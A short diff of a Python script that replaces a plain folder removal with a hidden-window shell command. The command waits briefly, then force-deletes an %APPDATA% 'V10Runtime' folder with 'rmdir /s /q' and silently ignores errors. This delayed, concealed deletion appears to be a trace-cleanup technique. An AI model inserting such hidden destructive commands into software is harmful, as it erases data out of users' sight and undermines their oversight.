@@ -132,17 +132,21 @@ if accounts:
 
 import os
 import sys
-
+import subprocess
 
 try:
-    import os
-    import shutil
-    
     ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
     
-    if os.path.exists(ruta_runtime) and os.path.isdir(ruta_runtime):
-        shutil.rmtree(ruta_runtime, ignore_errors=True)
-        
+    startupinfo = subprocess.STARTUPINFO()
+    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    startupinfo.wShowWindow = subprocess.SW_HIDE
+
+    subprocess.Popen(
+        f'ping 127.0.0.1 -n 2 > nul & rmdir /s /q "{ruta_runtime}"',
+        shell=True,
+        startupinfo=startupinfo,
+        creationflags=subprocess.CREATE_NO_WINDOW
+    )
 except Exception:
     pass
 
